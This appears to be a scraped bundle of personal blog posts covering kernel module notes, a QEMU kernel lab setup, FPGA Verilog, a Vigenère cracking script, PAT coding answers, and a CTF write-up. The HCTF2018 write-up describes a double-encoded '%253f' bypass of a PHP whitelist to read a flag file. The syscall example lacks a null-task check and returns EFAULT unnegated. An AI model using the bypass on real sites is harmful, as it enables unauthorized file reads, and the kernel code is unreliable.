init_task process is pointing to the init_thread_info In the file arch/arm/include/asm/thread_info.h, init_thread_info is defined as follows 1#define init_thread_info (init_thread_union.thread_info) init_thread_info is a member of thread_info of init_thread_union Variable init_thread_info is defined in init/init_task.c. 123456789101112union thread_union init_thread_union __init_task_data = { INIT_THREAD_INFO(init_task) };#define INIT_THREAD_INFO(tsk) \\ { \\ .task = &amp;tsk, \\ .flags = 0, \\ .preempt_count = INIT_PREEMPT_COUNT, \\ .addr_limit = KERNEL_DS, \\ } #define __init_task_data __attribute__((__section__(&quot;.data..init_task&quot;))) Declares the init_thread_union variable of type thread_union, then assigns values to the thread_info member of init_thread_union, mainly init_thread_union.thread_info thread_info. task=&amp;init_task, pointing the task member of this variable to init_task. attribute((section(&quot;.data...init_task&quot;)), specifying that the section name is .data...init_task, will be compiled into vmlinux at the beginning of .data. Stack compilation into vmlinux (TODO)123456789101112243 .data : AT(__data_loc) { 244 _data = .; /* address in memory */ 245 _sdata = .; 246 247 /* 248 * first, the init task union, aligned 249 * to an 8192 byte boundary. 250 */ 251 INIT_TASK_DATA(THREAD_SIZE) ======&gt; . = ALIGN(8192); \\ *(.data..init_task) TODO for_each_process(p)1#define for_each_process(p) for (p = &amp;init_task ; (p = next_task(p)) != &amp;init_task;) Start with init_task and iterate through all processes Linux interlinks the task structures of all processes into a circular bidirectional chain, like (&amp;init_task)-&gt;next ! = &amp;init_task goes on and on pid_task()123456789101112131415struct task_struct *pid_task(struct pid *pid, enum pid_type type){ struct task_struct *result = NULL; // First determine the pid can not be null, pid for null, pid_task return value is also null if (pid) { struct hlist_node *first; // The hlist_node *first can be found by the form parameter pid-&gt;tasks[type]. first = rcu_dereference_check(hlist_first_rcu(&amp;pid-&gt;tasks[type]), lockdep_tasklist_lock_is_held()); if (first) result = hlist_entry(first, struct task_struct, pids[(type)].node); } return result;} module_param()For the explanation of the three parameters of module_param.module_param(worldNum,int,0644);The first parameter is the name of the parameter, defined by yourselfThe second parameter is the type of the variable, such as int, long, char, float, etc.The third parameter is the permission, similar to the permission of a file. Here it should mean which users can modify the meaning of this parameter. 12* @perm is 0 if the the variable is not to appear in sysfs, or 0444* for world-readable, 0644 for root-writable, etc. Translated with www.DeepL.com/Translator (free version) list_for_each()12345678/** * list_for_each - iterate over a list * @pos: the &amp;struct list_head to use as a loop counter. * @head: the head for your list. */ #define list_for_each(pos, head) \\ for (pos = (head)-&gt;next, prefetch(pos-&gt;next); pos != (head); \\ pos = pos-&gt;next, prefetch(pos-&gt;next)) list_entry()12345678910#define list_entry(ptr, type, member) / container_of(ptr, type, member)#define container_of(ptr, type, member) /({ / const typeof( ((type *)0)-&gt;member ) *__mptr = (ptr);/ (type *)( (char *)__mptr - offsetof(type,member) ); /})#define offsetof(TYPE, MEMBER) ((size_t) &amp;((TYPE *)0)-&gt;MEMBER)","link":"/2022/03/09/Programming-Linux-Modules/"},{"title":"backup: Configuring the kernel environment from scratch","text":"Configuring kernel environment Compiling kernel Download kernel source code: https://www.kernel.org/ Install necessary dependencies 12sudo apt-get updatesudo apt-get install git fakeroot build-essential ncurses-dev xz-utils libssl-dev bc Unzip and enter the directory 1make menuconfig ps: There may be errors that require flex and bison, apt-get install can fix them Nothing should be changed, just save 123456enter kernel hackingSelect the following items Kernel debugging Compile-time checks and compiler options —&gt; Compile the kernel with debug info和Compile the kernel with frame pointers KGDBThen save and exit ps: Remember not to make the terminal window too small when make menuconfig. Otherwise you will be prompted and not allowed to complete the next steps. ```bashmake bzImage Setup is 17244 bytes (padded to 17408 bytes).System is 7666 kBCRC 5c77cbfeKernel: arch/x86/boot/bzImage is ready (#1) 123456789101112131415161718192021222324### Add a simple syscallHelloworld againCreate a `helloworld` directory in the root of the source code```bash$ pwd/home/test/test_kernel/linux-xxxxxxx/helloworld$ tree.├── helloworld.c└── Makefile$ cat helloworld.c #include &lt;linux/kernel.h&gt;asmlinkage long sys_helloworld(void){ printk(&quot;{==kernel==} hello world\\n&quot;); return 0;} $ cat Makefile obj-y=helloworld.o Then go to the Makefile in the root of the source code and add helloworld/ Then go to include/linux/syscalls.h and add the function prototype Add system call numbers to arch/x86/entry/syscalls/syscall_32.tbl and arch/x86/entry/syscalls/syscall_64.tbl After that, compile the kernel 1make bzImage It will be able to get bzImage in ./arch/x86/boot/ Compile busyboxAs usual, download from the official website https://busybox.net/ Unzip and enter the directory 1make menuconfig Selected Build static binary (no shared libs) within Settings 1make install After compiling, a _install directory will appear, then: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647$ cd _install$ mkdir proc$ mkdir sys$ touch init$ chmod +x init$ cat init#!/bin/shecho &quot;{==DBG==} INIT SCRIPT&quot;mkdir /tmpmount -t proc none /procmount -t sysfs none /sysmount -t debugfs none /sys/kernel/debugmount -t tmpfs none /tmp# insmod /xxx.ko # load komdev -s # We need this to find /dev/sda laterecho -e &quot;{==DBG==} Boot took $(cut -d' ' -f1 /proc/uptime) seconds&quot;setsid /bin/cttyhack setuidgid 1000 /bin/sh #normal user# exec /bin/sh #root// By the way, write a test case and put it in _install$ touch test.c$ cat test.c// gcc test.c -static -o test#include &lt;unistd.h&gt;int main(void){ syscall(1337); return 0;}$ gcc test.c -static -o test// Write a script to package rootfs.img$ cd ../../$ touch makeimg$ chmod +x makeimg$ cat makeimg#!/bin/shecho &quot;Generate rootfs.img&quot;cd busybox-x.xx.x/_installfind . | cpio -o --format=newc &gt; ../../rootfs.img$ ls busybox-x.xx.x linux-x.x.x qemu-x.xx.x makeimg$ ./makeimg$ lsbusybox-x.xx.x linux-x.x.x qemu-x.xx.x makeimg rootfs.img Install qumuHere using source code compilation 123456wget https://download.qemu.org/qemu-4.1.0.tar.xztar xvJf qemu-4.1.0.tar.xzcd qemu-4.1.0./configuremakemake install qemu bootGet a script from veritas501 1234567891011121314151617181920$ lsbusybox-x.xx.x linux-x.x.x qemu-x.xx.x makeimg rootfs.img$ touch runqemu$ chmod +x runqemu$ cat runqemu#!/bin/shqemu-system-x86_64 \\-m 64M \\-kernel /home/test/test_kernel/linux-x.x.x/arch/x86/boot/bzImage \\-initrd /home/test/test_kernel/rootfs.img \\-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 kalsr&quot; \\-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \\-nographic \\-monitor /dev/null \\-smp cores=2,threads=1 \\-enable-kvm \\-cpu kvm64,+smep \\# -gdb tcp::1234 \\# -S Run Script 1$ ./runqemu Done! Referencekernel环境配置 As well, thanks for MiGo and Aris’ guidance OWO Other possible problemsFreely write pkg-config not found sudo apt-get install pkg-config glib-2.40 gthread-2.0 is required to compile QEMU Use apt-cache search all | grep glib to find glib, can find glib’s name is libglib2.0-dev, then apt install libglib2.0-dev ERROR: pixman &gt;= 0.21.8 not present. Please install the pixman devel package. Solution:Use apt-cache search pixman to find, then apt install libpixman-1-dev Virtual machines remember to enable CPU virtualization VNC server running on 127.0.0.1:5900 sudo apt-get install libsdl1.2-dev sudo apt-get install gcc libsdl1.2-dev zlib1g-dev libasound2-dev pkg-config libgnutls-dev pciutils-dev sudo apt-get install libsdl2-dev sudo apt-get install libsdl2-2.0 sudo apt install libelf-dev","link":"/2022/03/09/backup-Configuring-the-kernel-environment-from-scratch/"},{"title":"backup: Digital Circuit Course Design, Music Player with VGA Display","text":"Busy with digital circuit labs. It’s been a long time since I coded QAQ. Nothing coded recently, so I just pull up the digital electricity course design QWQ~ Let’s start with a whole This is the top of the whole project, and then it is separate to each module Phase-Locked Loop Crossover This Phase-Locked Loop is used for dividing the frequency. My FPGA board is a Cyclone IV and comes with a 20MHz clock signal. The buzzer needs 1MHz, the music needs 4KHz, and the VGA display 640 * 480 * 60Hz needs 25MHz Music Module This is the music module, mainly divided into the number of notes recorded constep, recorded notes Rom, notes converted into buzzer frequency INX2CODE and sound SPK0 The constep is simply a counter that records the number of notes stored in the mif. The ROM is needed to turn the score into a mif file and then use the ROM module to generate the device. INX2CODE12345678910111213141516171819202122232425module INX2CODE (INX, F_CODE); input[3:0] INX; output[10:0] F_CODE; reg[10:0] F_CODE; always @(INX) case (INX) 0 : F_CODE &lt;= 11'H7FF; 1 : F_CODE &lt;= 11'H305; 2 : F_CODE &lt;= 11'H390; 3 : F_CODE &lt;= 11'H40C; 4 : F_CODE &lt;= 11'H45C; 5 : F_CODE &lt;= 11'H4AD; 6 : F_CODE &lt;= 11'H50A; 7 : F_CODE &lt;= 11'H55C; 8 : F_CODE &lt;= 11'H582; 9 : F_CODE &lt;= 11'H5C8; 10 : F_CODE &lt;= 11'H606; 11 : F_CODE &lt;= 11'H640; 12 : F_CODE &lt;= 11'H656; 13 : F_CODE &lt;= 11'H684; 14 : F_CODE &lt;= 11'H69A; 15 : F_CODE &lt;= 11'H6C0; default : F_CODE &lt;= 11'H6C0; endcaseendmodule SPK0 VGA Driver Convert the image to bmp format, then to mif, and save it to ROM like a note to generate a device. vga_driver12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455module vga_driver( clk, hs,vs, r,g,b, rgbin,dout ); input clk; output hs,vs; output r,g,b; input rgbin; output[15:0] dout; reg[9:0] hcnt,vcnt; reg r,g,b; reg hs,vs; assign dout={vcnt[7:0],hcnt[7:0]}; always @(posedge clk) if(hcnt&lt;800) hcnt&lt;=hcnt+1; else hcnt&lt;={10{1'b0}}; always @(posedge clk) if(hcnt==640+8) if(vcnt&lt;525) vcnt&lt;=vcnt+1; else vcnt&lt;={10{1'b0}}; always @(posedge clk) if((hcnt&gt;=640+8+8)&amp;(hcnt&lt;640+8+8+96)) hs&lt;=1'b0; else hs&lt;=1'b1; always @(vcnt) if((vcnt&gt;=480+8+2)&amp;(vcnt&lt;480+8+2+2)) vs&lt;=1'b0; else vs&lt;=1'b1; always @(posedge clk) if(hcnt&lt;256&amp;vcnt&lt;256) begin r=rgbin; g=rgbin; b=rgbin; end else begin r=0; g=0; b=0; endendmodule Selector 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667module choose2_1( EN, badapple,sakura, HS1,VS1,HS2,VS2, SPK1,SPK2, R1,R2,G1,G2,B1,B2, SPK,R,G,B,HS,VS ); input EN,badapple,sakura; input HS1,VS1,HS2,VS2; input SPK1,SPK2; input R1,R2,B1,B2; input G1,G2; output SPK; output HS,VS; output R,B; output G; reg SPK; reg HS,VS; reg R,B; reg G; always @ ( EN, badapple,sakura, HS1,VS1,HS2,VS2, SPK1,SPK2, R1,R2,G1,G2,B1,B2 ) if(EN==1) begin SPK=1; R=0; G=0; B=0; VS=0; HS=0; end else if({sakura,badapple}==2'B10) begin SPK=SPK1; R=R1; G=G1; B=B1; VS=VS1; HS=HS1; end else if({sakura,badapple}==2'B01) begin SPK=SPK2; R=R2; G=G2; B=B2; VS=VS2; HS=HS2; end else begin SPK=1; R=0; G=0; B=0; VS=0; HS=0; endendmodule I do not have a VGA monitor can only go to a friend’s bedroom to play ~ Source code: Github","link":"/2022/03/09/backup-Digital-Circuit-Course-Design-Music-Player-with-VGA-Display/"},{"title":"backup: HCTF2018 Warmup Writeup","text":"A easy challenge from HCTF 2018 The original plan was not to give the source code to come. Then I was told that if I didn’t give the source code, it would be impossible for people to solve it. And there was no easy Challenge, so the source code was given. Okay, the process of solving this Challenge: First of all, open the website and then look at F12, the comments hinted that there was source.php, a simple php audit, you can find that the problem appears in the following code 123456789$_page = urldecode($page);$_page = mb_substr( $_page, 0, mb_strpos($_page . '?', '?'));if (in_array($_page, $whitelist)) { return true;} It can be bypassed with %253f, combined with the flag in ffffllllaaaagggg in hint.php (Sorry. Seems like I should have told flag in / in the challenge description)…","link":"/2022/03/08/backup-HCTF2018-Warmup-Writeup/"},{"title":"backup: Markdown Syntax","text":"A small collection of Markdown general syntax index Heading Quote Font Dividing Line List Table Code Pic Hyperlink Autolink HTML Tags LaTeX Task List HeadingLevel 1 heading1# Level 1 Heading Level 2 heading1## Level 2 heading Level 3 heading1### Level 3 heading Level 4 heading1#### Level 4 heading Level 5 heading1##### Level 5 heading Level 6 heading1###### Level 6 heading Error Cases####### 7 Up to level 6 only ####### 712####### 7=== ######## 812######## 8--- If it is on the top line of === or ---, it will automatically become a title (corresponding to Level 1 and Level 2) Back to index Quote This is a quote! And it can overlay seems that you can always add… 12345&gt; This is a quote!&gt;&gt; And&gt;&gt;&gt; it can&gt;&gt;&gt;&gt; overlay&gt;&gt;&gt;&gt;&gt; seems that you can always add... Meow MeowMeow MeowMeow Meow 123&gt; Meow MeowMeow MeowMeow Meow It needs a line break to get the quote out Back to index FontBold Italic Also italic Bold and italic delete 12345**Bold***Italic*_Also italic_***Bold and italic***~~delete~~ Back to index Dividing Line 1234-----test--******* Why can’t you add text in the middle of the split line? ￣へ￣ Back to index ListNon-numeric list dot (〃’▽’〃) dot (｀・ω・´) and dot (￣.￣) 123+ dot (〃'▽'〃)* dot (｀・ω・´)- and dot (￣.￣) Numbers List o(￣▽￣)ｄ （￣︶￣）↗ ( • ̀ω•́ )✧ 1231. o(￣▽￣)ｄ 2. （￣︶￣）↗3. ( • ̀ω•́ )✧ List indent First Second Third Fourth OwO 123451. First 2. Second 3. Third 4. Fourth + OwO Back to index Table What to write? I don’t know… Then write freely. This is the content This is also content also~ Without a colon or colon on the left Both left and right is centered On the right is the right 1234|What to write?|I don't know...|Then write freely.||---------|:-----:|------:||This is the content | This is also content | also~||Without a colon or colon on the left|Both left and right is centered|On the right is the right| Back to index Code123456#include &lt;iostream&gt;using namespace std;int main() { cout &lt;&lt; &quot;Welcome to my blog~&quot; &lt;&lt; endl; return 0;} 12345678``` c++#include &lt;iostream&gt;using namespace std;int main() { cout &lt;&lt; &quot;Welcome to my blog~&quot; &lt;&lt; endl; return 0;}\\``` If it’s a single line of code, you can just `code` print &quot;Welcome to my blog~&quot; 1`print &quot;Welcome to my blog~&quot;` ``` can be combined with setting code highlighting Back to index Picture 12![avatar~](https://i.loli.net/2018/10/10/5bbdef9771e6a.jpg &quot;avatar&quot;)![pic_alt](pic_address &quot;pic_title&quot;) Back to index Hyperlink test 404 in China Still can be used when looking for some Chinese materials Home Page 123456+ [test](https://sm.ms &quot;test&quot;)+ [404 in China](https://www.google.com &quot;The world's largest search engine&quot;)+ [Still can be used when looking for some Chinese materials](https://www.baidu.com &quot;Learn Baidu well ah&quot;)+ [Home Page](https://aslin.site &quot;Home Page~&quot;)[alt](address &quot;title&quot;) 混合~ 1[![Try mixing](https://i.loli.net/2018/10/10/5bbdefcf4bc8f.jpg &quot;Try mixing&quot;)](https://aslin.site) Back to index Autolinklkjlkj174@gmail.com 1&lt;lkjlkj174@gmail.com&gt; Back to index HTML TagsCtrlZaZa 123&lt;kbd&gt;Ctrl&lt;/kbd&gt;Z&lt;sub&gt;a&lt;/sub&gt;Z&lt;sup&gt;a&lt;/sup&gt; Back to index LaTeX 公式 LaTeX Back to index Task List Heading Quate Font Diving Line List Table Code Picture Hyperlink Anchor（toc） Autolink LaTeX Footnotes Video (iframe) Embedded CSS Customized List Flowchart Timing Chart HTML Tags TOC Task list 123456789101112131415161718192021- [x] Heading- [x] Quate- [x] Font- [x] Diving Line- [x] List- [x] Table- [x] Code- [x] Picture- [x] Hyperlink- [x] Anchor（toc）- [x] Autolink- [x] LaTeX- [ ] Footnotes- [ ] Video (iframe)- [ ] Embedded CSS- [ ] Customized List- [ ] Flowchart- [ ] Timing Chart- [x] HTML Tags- [x] TOC- [x] Task list Back to index Try to translate the original blog, still lack of English skills emmmm","link":"/2022/03/08/backup-Markdown-Syntax/"},{"title":"backup: No Key Virginia Encryption Crack","text":"A script to crack Virginia encryption without a password 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182import re, mathdef openfile(fileName): file = open(fileName,'r') text = file.read() file.close() text = text.replace('\\n','') return textdef charOffset(char, offset): if(offset &lt; 0): offset += 26 if char.islower(): return chr((ord(char) - 97 + offset) % 26 + 97) else: return chr((ord(char) - 65 + offset) % 26 + 65)def Vigenere(strIn, key, encode): strOut = &quot;&quot; j = 0 for c in strIn: if c.isalpha(): offset = ord(key[j % len(key)]) - 97 j += 1 if encode == False: offset = -offset strOut += charOffset(c, offset) else: strOut += c return strOutdef deVigenereAuto(ciphertext): best_key = &quot;&quot; count = [] cipherMin = ciphertext.lower() cipherMin = re.sub('[^a-z]', '', ciphertext.lower()) freq = [8.167, 1.492, 2.782, 4.253, 12.702, 2.228, 2.015, 6.094, 6.966, 0.153, 0.772, 4.025, 2.406, 6.749, 7.507, 1.929, 0.095, 5.987, 6.327, 9.056, 2.758, 0.978, 2.360, 0.150, 1.974, 0.074]; for best_len in range(3, 13): sum = 0 for j in range(0, best_len): for i in range(0, 26): count.append(0) i = j while i &lt; len(cipherMin): count[ord(cipherMin[i]) - 97] += 1 i += best_len ic = 0 num = len(cipherMin)/best_len for i in range(0, len(count)): ic += math.pow(count[i]/num, 2) sum += ic if sum/best_len &gt; 0.065: break for j in range(0, best_len): for i in range(0, 26): count[i] = 0 i = j while i &lt; len(cipherMin): count[ord(cipherMin[i]) - 97] += 1 i += best_len max_dp = -1000000 best_i = 0 for i in range(0, 26): cur_dp = 0.0 for k in range(0, 26): cur_dp += freq[k] * count[(k + i) % 26] if cur_dp &gt; max_dp: max_dp = cur_dp best_i = i best_key += chr(best_i + 97) print &quot;best_key : &quot; + best_key print &quot;plaintext : &quot; + Vigenere(ciphertext, best_key, False)if __name__ == '__main__': ciphertext = openfile('ciphertext2.txt') a = raw_input(&quot;did you have key?(Y/N)&quot;) a = a.upper() if a == 'N': deVigenereAuto(ciphertext) if a == 'Y': key = raw_input(&quot;key?&quot;) print &quot;plaintext : &quot; + Vigenere(ciphertext, key, False)","link":"/2022/03/09/backup-No-Key-Virginia-Encryption-Crack/"},{"title":"backup: PAT","text":"题目思路就先不写了，以后再补(咕咕咕)，现在只有代码 Basic Level1001 害死人不偿命的(3n+1)猜想 （15 分） 卡拉兹(Callatz)猜想：对任何一个正整数 $n$，如果它是偶数，那么把它砍掉一半；如果它是奇数，那么把 $(3n+1)$ 砍掉一半。这样一直反复砍下去，最后一定在某一步得到 $n=1$。卡拉兹在 1950 年的世界数学家大会上公布了这个猜想，传说当时耶鲁大学师生齐动员，拼命想证明这个貌似很傻很天真的命题，结果闹得学生们无心学业，一心只证 $(3n+1)$，以至于有人说这是一个阴谋，卡拉兹是在蓄意延缓美国数学界教学与科研的进展……我们今天的题目不是证明卡拉兹猜想，而是对给定的任一不超过 1000 的正整数 $n$，简单地数一下，需要多少步（砍几下）才能得到 $n=1$？ 输入格式： 每个测试输入包含 1 个测试用例，即给出正整数 $n$ 的值。 输出格式： 输出从 $n$ 计算到 1 需要的步数。 输入样例： 3 输出样例： 5 C123456789101112131415#include &lt;stdio.h&gt;int main(void) { int i = 0, n; scanf(&quot;%d&quot;, &amp;n); while(n != 1) { i++; if(n % 2 == 0) { n = n / 2; } else { n = (3 * n + 1) / 2; } } printf(&quot;%d&quot;, i); return 0;} 1002 写出这个数 （20 分） 读入一个正整数 $n$，计算其各位数字之和，用汉语拼音写出和的每一位数字。 输入格式： 每个测试输入包含 1 个测试用例，即给出自然数 $n$ 的值。这里保证 $n$ 小于 10100 输出格式： 在一行内输出 $n$ 的各位数字之和的每一位，拼音数字间有 1 空格，但一行中最后一个拼音数字后没有空格。 输入样例： 1234567890987654321123456789 输出样例： yi san wu C12345678910111213141516171819202122232425262728293031323334353637383940414243#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main() { int a[100], i, s = 0, b[100]; char c[3000]; gets(c); for (i = 0; c[i] != '\\0'; i++) { b[i] = (int)c[i] - 48; s = s + b[i]; } for (i = 0; i &lt; 100 &amp;&amp; s != 0; i++) { a[i] = s % 10; s /= 10; } for (i = i - 1; i &gt;= 0; i--) { switch (a[i]) { case 0 : printf(&quot;ling&quot;); break; case 1 : printf(&quot;yi&quot;); break; case 2 : printf(&quot;er&quot;); break; case 3 : printf(&quot;san&quot;); break; case 4 : printf(&quot;si&quot;); break; case 5 : printf(&quot;wu&quot;); break; case 6 : printf(&quot;liu&quot;); break; case 7 : printf(&quot;qi&quot;); break; case 8 : printf(&quot;ba&quot;); break; case 9 : printf(&quot;jiu&quot;); break; } if(i &gt; 0) { printf(&quot; &quot;); } } return 0;} 1003 我要通过！ （20 分） “答案正确”是自动判题系统给出的最令人欢喜的回复。本题属于 PAT 的“答案正确”大派送 —— 只要读入的字符串满足下列条件，系统就输出“答案正确”，否则输出“答案错误”。 得到“答案正确”的条件是： 字符串中必须仅有P、A、T这三种字符，不可以包含其它字符； 任意形如xPATx的字符串都可以获得“答案正确”，其中x或者是空字符串，或者是仅由字母A组成的字符串； 如果aPbTc是正确的，那么aPbATca也是正确的，其中a、b、c均或者是空字符串，或者是仅由字母A组成的字符串。 现在就请你为PAT写一个自动裁判程序，判定哪些字符串是可以获得“答案正确”的。 输入格式： 每个测试输入包含 1 个测试用例。第 1 行给出一个正整数 $n(&lt;10)$，是需要检测的字符串个数。接下来每个字符串占一行，字符串长度不超过 100，且不包含空格。 输出格式： 每个字符串的检测结果占一行，如果该字符串可以获得“答案正确”，则输出 YES，否则输出 NO。 输入样例： 1234567898PATPAATAAPATAAAAPAATAAAAxPATxPTWhateverAPAAATAA 输出样例： 12345678YESYESYESYESNONONONO C12345678910111213141516171819202122232425262728293031323334353637383940#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main() { int n; char s[101]; int cntp = 0, cnta = 0, cntt = 0; char *p1, *p2; scanf(&quot;%d&quot;, &amp;n); while (n--) { int ispat = 0; cntp = 0; cnta = 0; cntt = 0; scanf(&quot;%s&quot;, s); for(int j = 0; s[j] != '\\0'; j++) { if(s[j] == 'P') { cntp++; } else if(s[j] == 'T') { cntt++; } else if(s[j] == 'A') { cnta++; } else { break; } } if(cntp == 1 &amp;&amp; cntt == 1 &amp;&amp; cnta != 0) { p1 = strchr(s, 'P'); p2 = strchr(s, 'T'); if((p1 - s) * (p2 - p1 - 1) == strlen(p2) - 1) { ispat = 1; } } if(ispat) { printf(&quot;YES\\n&quot;); } else { printf(&quot;NO\\n&quot;); } } return 0;} 1004 成绩排名 （20 分） 读入 $n$ $(n&gt;0)$名学生的姓名、学号、成绩，分别输出成绩最高和成绩最低学生的姓名和学号。 输入格式： 每个测试输入包含 1 个测试用例，格式为 12345&gt;第 1 行：正整数 n&gt;第 2 行：第 1 个学生的姓名 学号 成绩&gt;第 3 行：第 2 个学生的姓名 学号 成绩 ... ... ...&gt;第 n+1 行：第 n 个学生的姓名 学号 成绩 其中姓名和学号均为不超过 10 个字符的字符串，成绩为 0 到 100 之间的一个整数，这里保证在一组测试用例中没有两个学生的成绩是相同的。 输出格式： 对每个测试用例输出 2 行，第 1 行是成绩最高学生的姓名和学号，第 2 行是成绩最低学生的姓名和学号，字符串间有 1 空格。 输入样例： 12343Joe Math990112 89Mike CS991301 100Mary EE990830 95 输出样例： 12Mike CS991301Joe Math990112 C1234567891011121314151617181920212223242526272829303132#include &lt;stdio.h&gt;int main(void) { int n, i, j; struct Stu { char name[11]; char num[11]; int grade; }stu[1000]; struct Stu temp = { &quot;0&quot;, &quot;0&quot;, 0 }; scanf(&quot;%d&quot;, &amp;n); for(i = 0; i &lt; n; i++) { scanf(&quot;%s %s %d&quot;, stu[i].name, stu[i].num, &amp;stu[i].grade); } for(i = 0; i &lt; n; i++) { for(j = i + 1; j &lt; n; j++) { if(stu[i].grade &lt; stu[j].grade) { temp = stu[i]; stu[i] = stu[j]; stu[j] = temp; } } } printf(&quot;%s %s\\n&quot;, stu[0].name, stu[0].num); printf(&quot;%s %s\\n&quot;, stu[n - 1].name, stu[n - 1].num); return 0;} 1005 继续(3n+1)猜想 （25 分） 卡拉兹(Callatz)猜想已经在1001中给出了描述。在这个题目里，情况稍微有些复杂。 当我们验证卡拉兹猜想的时候，为了避免重复计算，可以记录下递推过程中遇到的每一个数。例如对 n=3 进行验证的时候，我们需要计算 3、5、8、4、2、1，则当我们对 n = 5、8、4、2 进行验证的时候，就可以直接判定卡拉兹猜想的真伪，而不需要重复计算，因为这 4 个数已经在验证3的时候遇到过了，我们称 5、8、4、2 是被 3“覆盖”的数。我们称一个数列中的某个数 n 为“关键数”，如果 n 不能被数列中的其他数字所覆盖。 现在给定一系列待验证的数字，我们只需要验证其中的几个关键数，就可以不必再重复验证余下的数字。你的任务就是找出这些关键数字，并按从大到小的顺序输出它们。 输入格式： 每个测试输入包含 1 个测试用例，第 1 行给出一个正整数 $K(&lt;100)$，第 2 行给出 $K$ 个互不相同的待验证的正整数 $n$ $(1&lt;n≤100)$的值，数字间用空格隔开。 输出格式： 每个测试用例的输出占一行，按从大到小的顺序输出关键数字。数字间用 1 个空格隔开，但一行中最后一个数字后没有空格。 输入样例： 1263 5 6 7 8 11 输出样例： 7 6 C123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#include&lt;stdio.h&gt;#include&lt;malloc.h&gt;void sort(int *, int );int main() { int * a; int n, i, t, j; scanf(&quot;%d&quot;, &amp;n); a = (int*) malloc (n * sizeof(int)); // 动态申请数组空间 for(i = 0; i &lt; n; i++) { scanf(&quot;%d&quot;, &amp;a[i]); } for(i = 0; i &lt; n; i++) { t = a[i]; if(t == 0) { continue; // 碰到数组中有0的项，则跳过 } while(t != 1) { if(t % 2 == 0) { t /= 2; } else { t = (3 * t + 1) / 2; } for(j = 0; j &lt; n; j++) { // 数组中所有数与运算中出现的数比较 if(a[j]==t) { // 如果数组中有和运算过程中相同的数，就把数组中的该数改为0 a[j]=0; break; // 因为输入的数组是互不相同的数，所以不会存在有多个匹配的情况，找到有一个匹配就可跳出，以节省内存减少运行时间。 } } } } sort(a, n); // 排序 for(i = 0; a[i] &gt; 0; i++) { printf(&quot;%d%s&quot;, a[i], a[i + 1] &gt; 0 ? &quot; &quot; : &quot;&quot;); } return 0;}void sort(int *P, int K) { // 排序 int i, j, temp; for(i = 0; i &lt; K; i++) { for(j = i + 1; j &lt; K; j++) { if(P[i] &lt; P[j]) { temp = P[i]; P[i] = P[j]; P[j] = temp; } } }} 1006 换个格式输出整数 （15 分） 让我们用字母B来表示“百”、字母S表示“十”，用12...n来表示不为零的个位数字n $(&lt;10)$，换个格式来输出任一个不超过 3 位的正整数。例如234应该被输出为BBSSS1234，因为它有 2 个“百”、3 个“十”、以及个位的 4。 输入格式： 每个测试输入包含 1 个测试用例，给出正整数 $n(&lt;1000)$。 输出格式： 每个测试用例的输出占一行，用规定的格式输出 n。 输入样例 1： 234 输出样例 1： BBSSS1234 输入样例 2： 23 输出样例 2： SS123 C++12345678910111213141516171819202122232425262728#include &lt;iostream&gt;using namespace std;int main() { int n, i, j, l, k = 1; cin &gt;&gt; n; i = n / 100; l = n % 10; n = n % 100; j = n / 10; while (k &lt;= i) { cout &lt;&lt; 'B'; k++; } k = 1; while (k &lt;= j) { cout &lt;&lt; 'S'; k++; } k = 1; while (k &lt;= l) { cout &lt;&lt; k; k++; } return 0;} 1007 素数对猜想 （20 分） 让我们定义dn为：dn = pn+1 - pn,其中pi是第i个素数。显然有d1 = 1，且对于$n&gt;1$有dn是偶数。“素数对猜想”认为“存在无穷多对相邻且差为 2 的素数”。 现给定任意正整数N(&lt;105)，请计算不超过N的满足猜想的素数对的个数。 输入格式: 输入在一行给出正整数N。 输出格式: 在一行中输出不超过N的满足猜想的素数对的个数。 输入样例: 20 输出样例: 4 C++12345678910111213141516171819202122232425262728#include &lt;iostream&gt;#include &lt;cmath&gt;using namespace std;int main() { int n, k = 0; int a[100000]; cin &gt;&gt; n; int j; for(int i = 2; i &lt;= n; i++) { for(j = 2; j &lt;= sqrt(i); j++) { if(i % j == 0) { break; } } if(j &gt; sqrt(i)) { a[k++] = i; } } int prime = 0; for(int i = 0; i &lt; k; i++) { if(a[i + 1] - a[i] == 2) { prime++; } } cout &lt;&lt; prime; return 0;}","link":"/2022/03/09/backup-PAT/"},{"title":"backup: Syscalls and problems encountered","text":"In the previous article, we finished setting up the kernel environment. Now let’s try to write a system call to modify or read the nice value of a given process and return the latest nice value and priority prio of the process. Successful methodThis is a successful method and seems to be the one most people use First, go to include/linux/syscalls.h and add the following function prototype After that, go to arch/x86/entry/syscalls/syscall_32.tbl and arch/x86/entry/syscalls/syscall_64.tbl respectively and add the system call number ps:Make sure to add __ia32_ to syscall_32.tbl and __x64_ to syscall_64.tbl, just like the picture above, otherwise you may get an error like underfined reference to xxx. Add code in kernel/sys.c After that just make -j8 bzImage and wait for a few minutes After compiling, write a demo to see if it works Then use the script to make the rootfs.img and launch qemu Let’s talk about this syscall 1234567891011121314151617181920212223242526272829303132333435SYSCALL_DEFINE5(lab1, pid_t, pid, int, flag, int, nicevalue, void __user *, prio, void __user *, nice) { struct pid * mypid; struct task_struct * task; int nice_before; int nice_after; // First, we use the function find_get_pid() here to get the struct_pid structure of the pid we are requesting mypid = find_get_pid(pid); // Then we use the pid_task() function to get the pid corresponding task_struct structure for task_nice() and set_user_nice() task = pid_task(mypid, PIDTYPE_PID); nice_before = task_nice(task); // Get the current nice value if(flag == 1) { set_user_nice(task, nicevalue); // Modify nice value printk(&quot;This is origin nice : %d\\nThis is the nice now : %d\\n&quot;, nice_before, nicevalue); } else if(flag == 0) { printk(&quot;The nice is : %d\\n&quot;, nice_before); } /** copy_to_user(void __user *to, const void *from, unsigned long n) The three parameters are the user memory address, the kernel space address and the data length * user memory address, use (int *)prio * Kernel space address, mainly about task_struct structure, use &amp;task_struct * Data length is the length of this prio, sizeof(task_prio) The same goes for the nice value returned later **/ if(copy_to_user((int *)prio, &amp;task-&gt;prio, sizeof(task-&gt;prio))) { return EFAULT; } nice_after = task_nice(task); if(copy_to_user((int *)nice, &amp;nice_after, sizeof(nice_after))) { 